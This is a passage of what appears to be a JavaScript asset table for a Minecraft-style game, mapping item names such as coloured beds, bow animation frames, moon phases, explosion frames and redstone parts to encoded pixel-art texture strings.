    purpleBedIcon: "0g0gb000WUYZYWWZSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    orangeBed: [
			"0g0g4W1YWYhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
			"0g0gdZZ|WcWZZZWwWKWWWY1YW0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbKWWWwWW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZWwWKWW1Y|WWW*WWkZZW0000hh2)VVhg)VUGGG-QIyyyyOOOOV)Uwhh0U)D1h7Q)Q>DGGGOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0geWKWWwW*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    whiteBed: [
			"0g0g4ZYHZZZhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0g7HY|WcWZZZWZ0i]2S5+IBPAXBAJgxAJR1AJR9PAXPA204JP90N]S00JNPAxAJA0+1}c",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
  		"0g0gb|WcWHWW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0gcHYW|WcWW*WWkZZW0000hh2z0i0(hgNz023OOONAO2QyyyyyyyyGV0z3Rwhh03z4Rz1h3OzONzOOOyyyyyyyyVG",
    	"0g0gbcW|WHW*WWWZWY00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIGyyiyyxhiyyyyxhOOOOOOOO?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    pinkBedIcon: "0g0gb000W@YZYHHZSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    magentaBedIcon: "0g0gb000WYZY=H<YZSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    greenBed: [
			"0g0g4VH1HPWhYhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZW$W<TW*hWPWhY1HVH0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gb<TW*hWPW$WW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZW$W<TWPW1H|W*hWW*WWkZZW0000hh2)VVhg)VUUGGG-QUIyyyyOOOOVQUwhh0UQD1h7QQQ>DGGGOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0ge*hW<TWPW$W*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    brownBed: [
			"0g0g4RZHiYZhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZWUYWZiYZHRZ0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbWZiYUYW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZWUYWiYH|WZW*WWkZZW0000hh2)VVhg)VUGGG-QIyyyyOOOOV)Uwhh0U)D1h7Q)Q>DGGGOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0geZWiYUY*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    orangeBedIcon: "0g0gb000WhZZYWWWSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    limeBedIcon: "0g0gb000W?ZZYWHMY1WSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    blackBed: [
			"0g0g4sHwYoZEZhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
   		"0g0gdZZ|WcWZZZW4gHkYcMHoZEZwYsH0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbkYcMHoZ4gHW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZW4gHkYoZwYcMH|WW*WWkZZW0000hh2)VVhg)VUIII,QGyyyyOOOOVUwhh0UE1h8QQ>EIIIOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0gecMHkYoZ4gH*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    pinkBed: [
			"0g0g4Z!ZHHhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZWHWDWHH!ZZ0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbWDWHHW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZWHWH!Z|WDWW*WWkZZW0000hh2)VVhg)VUGGG-QIyyyyOOOOV)Uwhh0U)D1h7Q)Q>DGGGOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0geDWWHH*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    greenBedIcon: "0g0gb000W<MZZYYWPHSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    lightBlueBedIcon: "0g0gb000WM+ZZYYY.ZSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    limeBed: [
			"0g0g4YhYYNYhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZWTWWWYNYhYY0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbWWYTWW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZWTWWYhY|WWW*WWkZZW0000hh2)VVhg)VUGGG-QIyyyyOOOOV)Uwhh0U)D1h7Q)Q>DGGGOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0geWWYTW*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    grayBed: [
			"0g0g4WWWYhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZW.kWPYP?WWYWW0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbPYP?WW.kWW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZW.kWPYWW|WP?WW*WWkZZW0000hh2)VVhg)VUGGG-QIyyyyOOOOV)Uwhh0U)D1h7Q)Q>DGGGOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0geP?WPYW.kW*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    grayBedIcon: "0g0gb000W(WZYZ|)Z-YSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    cyanBedIcon: "0g0gb000WM@WZYY|Y.GWSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    cyanBed: [
			"0g0g4iWiZiEHmYhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZW9kHdYdZiEHmYiZiW0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbdYdZiEH9kHW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ggZZW9kHdYiEHiZ|WdZW*WWkZZW0000hh2)VVhg)VUGGG-QIyyyyOOOOV)Uwhh0U)D1h7Q)Q>DGGGOOOOyyyyZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ",
    	"0g0gedZdYiEH9kH*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    blueBed: [
			"0g0g4<_W?Z./HTWhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZWwW*pY$H./HTW?Z<_W0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
    	"0g0g7000WkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gb*pY$H./HwWW*WWWZkZ000100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ghZZWwW*pY./H?ZEZ|W$HW*WWkZZW00002gX2pasS2g2paRgXx2q]RFgXx8RoM%%^F}Rzg2gX0FeRzi0gX8xeRgigXx8oMgXx8RM|Xx8RgXx8RgXx8RgXx8RgXx8RgXx8RgXx8RgXx8Rg",
    	"0g0ge$H*pY./HwW*WWWZWZZ|WW00001hiyyx000hhhh0000000000OOOOOOOO?UQV?Q?UGIIIIG?UQV?Q?UGIIIIG",
    	"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    brownBedIcon: "0g0gb000W;ZZYZOW{HSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    blueBedIcon: "0g0gb000WoWZYWM:WsHSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    
    bowPulling2: "0g0gb000ZZZ]HWYJHMZEYY?kHH00000000000000000100yyyw03SyV00GGG00D000020000270900B00900C07900B00900B00700B009000C9000B000007000000",
    bowPulling1: "0g0gb000ZZZ]HWYJHMZEYY?kHH000000000g0000yw0)00yy07yVG00GG000D0000200900270900B0000C0700B00000B00002000002000002000000000000",
    bowPulling0: "0g0gb000ZZZWY]HEYJHMZY?kHH100000002(0004QS000Q@G05KQV00V000?0090040090045K000@09000[05000@000040000040900004900004000000000000",
    bow: "0g0g8000]HJHMZEYY?kHH0000000000i]000A009|Pw00J1030c00r0K00nS30000o000000060005S(0005000500005S0000200000",
    
    moonPhases0: "0w0wm00W00H0gY4gY4gZ4wZ4xW8MH8MY8TYcTZcRW8TZcWcHgYZJHHYZW000000000000000000000000000000000000000000000000Xx8Rg0000000000000RgXx8RgXw00000000018RxcRgx4x800000000x8NkF^TT8S0000004yooMgR000000X>x{.oog00000XFERwg0000gIMXF_XsEg000gM*wM6g000hc/oM7M@w002hg/kRgB+7.IwX002hR@XD,*].(X002hk^@#,*P.wX002hkRBD.wX002hkRhD,.wX002hk^#,*P.wX002hR,*].(X002hg/k+7.IwX000hc/oM7M@w000gM*wM6g000gIMXF_XsEg0000XFERwg00000X>x{.oog000004yooMgR0000000x8NkF^TT8S000000018RxcRgx4x80000000000RgXx8RgXw0000000000000Xx8Rg00000000000000000000000000000000000000000000000",
		moonPhases1: "0w0wn00W00H0gY4gY4gZ4wZ4xW8MH8MY8TYcTZcRW8TZcWcHgYZYEYJHZHW000000000000000000000000000000000000000000000000Xx8Rg0000000000000RgXx8RgXw00000000018RxcRgx4x800000000x8NkF^TT8S0000004yooMgR000000X>x{.oog00000XFERwg0000gIMXF_XsEg000gM*wM6g000hc/oM7M@w002hg/kRhJ7.IwX002hR}*].(X002hk^}*P.wX002hkR.wX002hkRj.wX002hk^*P.wX002hRM*].(X002hg/k*J7.IwX000hc/oM7M@w000gM*wM6g000gIMXF_XsEg0000XFERwg00000X>x{.oog000004yooMgR0000000x8NkF^TT8S000000018RxcRgx4x80000000000RgXx8RgXw0000000000000Xx8Rg00000000000000000000000000000000000000000000000",
		moonPhases2: "0w0wn00W00H0gY4gY4gZ4wZ4xW8MH8MY8TYcTZcRW8TZcWcHgYZYEYJHZHW000000000000000000000000000000000000000000000000Xx8Rg0000000000000RgXx8RgXw00000000018RxcRgx4x800000000x8NkF^TT8S0000004yooMgR000000X>x{.oog00000XFERwg0000gIMXF_XsEg000gM*wM6g000hc/oM7M@w002hg/kRMJ7.IwX002hR}MJ*].(X002hk^}MJ*P.wX002hkR*J.wX002hkR*J.wX002hk^MJ*P.wX002hRMJ*].(X002hg/k*J7.IwX000hc/oM7M@w000gM*wM6g000gIMXF_XsEg0000XFERwg00000X>x{.oog000004yooMgR0000000x8NkF^TT8S000000018RxcRgx4x80000000000RgXx8RgXw0000000000000Xx8Rg00000000000000000000000000000000000000000000000",
		moonPhases3: "0w0wj00W00H0gY4gY4gZ4wZ4xW8MH8MY8TYcTZcRW8TZcWcHgYYEYH000000000000000000000000000000000000000000000000Xx8Rg0000000000000RgXx8RgXw00000000018RxcRgx4x800000000x8NkF^TT8S0000004yooMgR000000X>x{.oog00000XFERwg0000gIMXF_XsEg000gM*wM6g000hc/oM7M@w002hg/kRh7.IwX002hR^!*].(X002hk^?^*P.wX002hkR?^.wX002hkR?^.wX002hk^?^*P.wX002hR^!*].(X002hg/kRh7.IwX000hc/oM7M@w000gM*wM6g000gIMXF_XsEg0000XFERwg00000X>x{.oog000004yooMgR0000000x8NkF^TT8S000000018RxcRgx4x80000000000RgXx8RgXw0000000000000Xx8Rg00000000000000000000000000000000000000000000000",
		moonPhases4: "0w0wh00W00H0gY4gY4gZ4wZ4xW8MH8MY8TYcTZcRW8TZcWcHgYEY000000000000000000000000000000000000000000000000Xx8Rg0000000000000RgXx8RgXw00000000018RxcRgx4x800000000x8NkF^TT8S0000004yooMgR000000X>x{.oog00000XFERwg0000gIMXF_XsEg000gM*wM6g000hc/oM7M@w002hg/kRgXx67.IwX002hRF^7*].(X002hk^F^7*P.wX002hkRF^7.wX002hkRF^7.wX002hk^F^7*P.wX002hRF^7*].(X002hg/kRgXx67.IwX000hc/oM7M@w000gM*wM6g000gIMXF_XsEg0000XFERwg00000X>x{.oog000004yooMgR0000000x8NkF^TT8S000000018RxcRgx4x80000000000RgXx8RgXw0000000000000Xx8Rg00000000000000000000000000000000000000000000000",
		moonPhases5: "0w0wj00W00H0gY4gY4gZ4wZ4xW8MH8MY8TYcTZcRW8TZcWcHgYEYYH000000000000000000000000000000000000000000000000Xx8Rg0000000000000RgXx8RgXw00000000018RxcRgx4x800000000x8NkF^TT8S0000004yooMgR000000X>x{.oog00000XFERwg0000gIMXF_XsEg000gM*wM6g000hc/oM7M@w002hg/kF^Xm7.IwX002hRF^Uzn*].(X002hk^F^n*P.wX002hkRF^D.wX002hkRF^n.wX002hk^F^n*P.wX002hRF^UBn*].(X002hg/kF^Xm7.IwX000hc/oM7M@w000gM*wM6g000gIMXF_XsEg0000XFERwg00000X>x{.oog000004yooMgR0000000x8NkF^TT8S000000018RxcRgx4x80000000000RgXx8RgXw0000000000000Xx8Rg00000000000000000000000000000000000000000000000",
		moonPhases6: "0w0wn00W00H0gY4gY4gZ4wZ4xW8MH8MY8TYcTZcRW8TZcWcHgYEYHWZYZJH000000000000000000000000000000000000000000000000Xx8Rg0000000000000RgXx8RgXw00000000018RxcRgx4x800000000x8NkF^TT8S0000004yooMgR000000X>x{.oog00000XFERwg0000gIMXF_XsEg000gM*wM6g000hc/oM7M@w002hg/kF+7.IwX002hRF,*].(X002hk^F,*P.wX002hkRF.wX002hkRFD,.wX002hk^F,*P.wX002hRF,*].(X002hg/kFF@7.IwX000hc/oM7M@w000gM*wM6g000gIMXF_XsEg0000XFERwg00000X>x{.oog000004yooMgR0000000x8NkF^TT8S000000018RxcRgx4x80000000000RgXx8RgXw0000000000000Xx8Rg00000000000000000000000000000000000000000000000",
		moonPhases7: "0w0wn00W00H0gY4gY4gZ4wZ4xW8MH8MY8TYcTZcRW8TZcWcHgYEYYZJHZWH000000000000000000000000000000000000000000000000Xx8Rg0000000000000RgXx8RgXw00000000018RxcRgx4x800000000x8NkF^TT8S0000004yooMgR000000X>x{.oog00000XFERwg0000gIMXF_XsEg000gM*wM6g000hc/oM7M@w002hg/kF@7.IwX002hR!l[*].(X002hk^R*[*P.wX002hkRR+,.wX002hkRRF[.wX002hk^RM[*P.wX002hR!hn*].(X002hg/kFm7.IwX000hc/oM7M@w000gM*wM6g000gIMXF_XsEg0000XFERwg00000X>x{.oog000004yooMgR0000000x8NkF^TT8S000000018RxcRgx4x80000000000RgXx8RgXw0000000000000Xx8Rg00000000000000000000000000000000000000000000000",
    
    quicksand: "0g0g8^YZWW^WpY^HFZ5C3A0APwxUJ}X19daC{:zF^ER:(T|%I@JP0d8U0%",
    arrow: "0g0g9WZZZ000cWkZY?YWZ12yyyyyywgyyyyz2Q](wgyyyyE12yyyyyyy2yyyyyyyiyyyyyy12yyyyyyiyyyyyyy2yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy",
    arrowIcon: "0g0ga000HZZZ?kHYJHEYWsH;Z0000000000000000000000i(00000kT(00000*>000000j000005K(000000000005K0000000000005K000007000000000000000000900000000000000",
    glisteringMelonSlice: "0g0gg000YhZWYWZ$HwYZHHwHYZZZZYZ000000000000000000i0000001)00000i00000j0000q0000j000i?000~00e+00ejVUw00A@I00eyO=0000e000000000",
    untntTop: "0g0g2ZZZ00WhhVV*ZZrGvZZvGrZZ*VVhhZZ",
    untntBottom: "0g0g2ZZZ00WhhhhhhZZhhhhhhZZhhhhhhZZhhhhhhZZ",
    untnt: "0g0g4ZZZ00W0WfZ11111111111111111111VVVV/L-$E$-VVVV11111111111111111111",
    blank: "01011ZZZ",
    "explosion_0": "0w0w2000ZZZ00000000000000000000000000000000000000000000000000000300700700700700300000000000000000000000000000000000000000000000000000",
		"explosion_1": "0w0w2000ZZZ0000000000000000000000000000000000000000000000000300700f00f00f00f0070030000000000000000000000000000000000000000000000000",
		"explosion_2": "0w0w2000ZZZ000000000000000000000000000000000000000000000300f00f00v00v00v00v00f00f003000000000000000000000000000000000000000000000",
		"explosion_3": "0w0w2000ZZZ00000000000000000000000000000000000000000300f00v00v00W00W00W00W00v00v00f00300000000000000000000000000000000000000000",
		"explosion_4": "0w0w2000ZZZ0000000000000000000000000000000000000700f00v00W00H00H00H00H00H00H00W00v00f0070000000000000000000000000000000000000",
		"explosion_5": "0w0w2000ZZZ000000000000000000000000000000000700v00W00H00H00ZZ00ZZ00ZZ00ZZ00ZZ00ZZ00H00H00W00v007000000000000000000000000000000000",
		"explosion_6": "0w0w2000ZZZ00000000000000000000000000000700v00W00H00ZZ00Z01Z1ZZ1ZZ1ZZ1ZZ1ZZ0ZZ00ZZ00H00W00v00700000000000000000000000000000",
		"explosion_7": "0w0w2000ZZZ0000000000000000000000000700v00H00ZZ00Z01Z1Z3Z3Z3Z3ZZ3ZZ3ZZ1ZZ1ZZ0ZZ00ZZ00H00v0070000000000000000000000000",
		"explosion_8": "0w0w2000ZZZ000000000000000000000700v00H00Z01H1H30W30W70W70W7H7H7Z7ZZ3ZZ3ZZ1ZZ1ZZ0ZZ00H00v007000000000000000000000",
		"explosion_9": "0w0w2000ZZZ00000000000000000700W00S00H010W20v40f40f40fc0fc0fc0fe0vf0WfH7Z7ZZ7ZZ3ZZ1ZZ0ZZ00H00W00700000000000000000",
		"explosion_10": "0w0w2000ZZZ00000000000007000000W000v00f007007003003003g03g03g03o07o07s0fe0vf0WfZ7ZZ7ZZ3ZZ1ZZ0ZZ00W0070000000000000",
		"explosion_11": "0w0w2000ZZZ0000000000000;000f0007003003001001000000000000000000w01w01(03(03o07s0ff0WfZ7ZZ3ZZ1ZZ0ZZ00W00f000000000",
		"explosion_12": "0w0w2000ZZZ000000g000400030001000000000000000000;000;000=000=000=000=000000000S00000w01g03o07e0vfZ7ZZ3ZZ0ZZ00W00f00000",
		"explosion_13": "0w0w2000ZZZ00000000000000S000K000(000-000s000s000e000e000e000f000f000f000f000f000v000v000W000=000000000w01o07e0v7H3ZZ1ZZ0H00f0",
		"explosion_14": "0w0w2000ZZZ00000000000000000000000000000004000400020002000200030003000300030003000700070007000e000e000u000;00000000100300f1H0H00f0",
		"explosion_15": "0w0w2000ZZZ000000000000000000000000000000000000000000000000000000000000000000000001000100010002000200060004000c000o000(000K00000300e0000",
    dripFall: "08083000ZZZH00120000000000",
		dripHang: "08083000ZZZH12000000000000",
		dripLand: "08083000ZZZH000000600000000",
		splash_0: "08084000?Zp$Z0Z000000000000430",
		splash_1: "08083000?Zp$Z000000000000400",
		splash_2: "08082000p$Z00000080",
		splash_3: "08083000?Z0Z0000000000004080",
    generic_0: "08082000ZZZ00008000",
		generic_1: "08082000ZZZ000g8000",
		generic_2: "08082000ZZZ000gc080",
		generic_3: "08082000ZZZ004gcs80",
		generic_4: "08082000ZZZ00kocu80",
		generic_5: "08082000ZZZ00kq$uE0",
		generic_6: "08082000ZZZ08)ru!g",
		generic_7: "08082000ZZZg})#)",
    spyglassModel: "0g0gbHYY000YZ(WUHTW>YYWW1yyyyyyyjyyyyyyy?yyyyyyyyyyyyyyyyyyyyy?yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy1yyyyyyyjyyyyyyyyyyyyyyy",
    dispenserFrontVertical: "0g0g9)Z;YYYHoHJPWwWgTW00g0hgh02O>UOQOw2@yNOQS3VB?A(4VU)V)xk)QMj?Ox3>)wkVIImVTkUIIlUS4V*?Qw4?)kyMj?>BSjAN??>(3yBA)O>(2zUzNOw00g0hh00",
    dispenserFront: "0g0ge)Z;YYYHoHJPWsHWYZgTWwWZ00g0hgh02O>UOQOw2@yNOQS3VGA?GA(4I[Ixk,-8x3+wkTj(9aqKmKd3)>|QO(00g0hh00",
    dropperFrontVertical: "0g0g9)Z;YYYHoHJPWwWgTW00g0hgh02O>UOQOw2@yNOQS3VA?A(4VUz?V)xkONyyBOx3xGGwkVDIIVTkUDIImUS4VDGmQw4?*yMj?>VBSjAN??>(3yBA)O>(2zUzNOw00g0hh00",
    dropperFront: "0g0ge)Z;YYYHoHJPWsHWYZwWgTWZ00g0hgh02O>UOQOw2@yNOQS3VGA?GA(4I[Ixk,-8x3+wkTj(9aqKmKd3)>|QO(00g0hh00",
    hopper: [
			/*inside*/"0g0g4;W)Y$WAJY00U05VlmZZZZZZrZZqZZmYZmlmU5V01V0",
    	/*Outside*/"0g0g7WY|)ZPAY;W$W)Y400g]ByPAJP]JFy^PiP+PAJPA|APC|]+J|s@",
    	/*top*/"0g0g7PAY|)ZYW)Y;W0004y]w00001y1yTRRRR>>>>RRRRRRy1w000014y]"
		],
    hopperIcon: "0g0g8000P)Y;Z-YTkWVW(WW00000000000002PA01m0a,91FZ0yJP{004NK005HK000Y00000000n-0000l0000200000000",
    targetSide: "0g0gaYYWZZZZHZAYHW1x3xxTx>B6>1A1A1Bzzxzx3FxzBTzQDzX?>zT[T?>B?>[>[[>[z>>[>7xx>B1B1z9zx3xAA93AAA22B4x3x3>zz",
	  targetTop: "0g0gaZYWHZAYHWZZZY1yhxhyxij>?>>RAEwyE21jgowiinxgTjio2lozw1xxTzhRjjxlw]5BlxTx1B2TBgwEz0jg8S7211yRng0wF9Rz>>[ygwgwyp",
    comparator: [
			/*off*/"0g0gdY-YYZ$HHrY#ZYH0WQ0W$0W1h1h1hhh2OOyAQRMjAQRyOOMkRyyyyQxjOyAQyy(iyy(2Nx0)T6z0h2wB(hgRg)1QN8Qjx8M3wA(iwAxjARyAQRMkRyQyyOMhh1hhhh1",
    	/*on*/"0g0geY-YYZ$HHrY#ZYHZ0W0H0W1h1h1hhh2OOyAQRMjAQRyOOMkRyyyyQxjOyAQyy(iyy(2Nx0)T6z0h2wB(hgRg)1QN8Qjx8M3wA(iwAxjARyAQRMkRyQyyOMhh1hhhh1"
		],
    comparatorIcon: "0g0gc000XgH0WSgZHSW>W)HbHWYY00000000000000i0000000j0000000?001w000?001(000004K00000401w000X1(000pK000xA000a)0000a00000a000000000000000000",
    blueRedstone: "0g0g80001W2Z3Z3ZZ1VY0Z5AY000000000000000000001w0000a0000G000200m00Y03q0+00dYK000+00000000000000",
    /*cowSide:"0g0g4000K;=K=00000000000000005VVSVVVYYZZZZZZ;00;00;00;00",
    cow: "0g0g20==00gs--fof1xOj7o064(o7s",*/
